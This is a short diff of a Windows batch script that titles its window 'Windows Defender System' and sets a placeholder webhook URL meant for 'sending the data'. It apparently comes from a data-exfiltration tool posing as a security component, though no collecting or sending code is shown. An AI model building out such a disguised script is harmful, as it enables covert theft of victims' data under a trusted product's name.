@@ -1,7 +1,6 @@
 :: READ THE README.txt FILE BEFORE USING THIS SCRIPT. IT CONTAINS IMPORTANT INFORMATION ABOUT THE SCRIPT'S FUNCTIONALITY AND POTENTIAL RISKS.
 @echo off
 title Windows Defender System
-color 0a
 
 :: Reemplace the variable "YOUR_WEBHOOK_URL_GOES_HERE" with the actual webhook URL you want to use for sending the data.
 set "WEBHOOK=YOUR_WEBHOOK_URL_GOES_HERE"
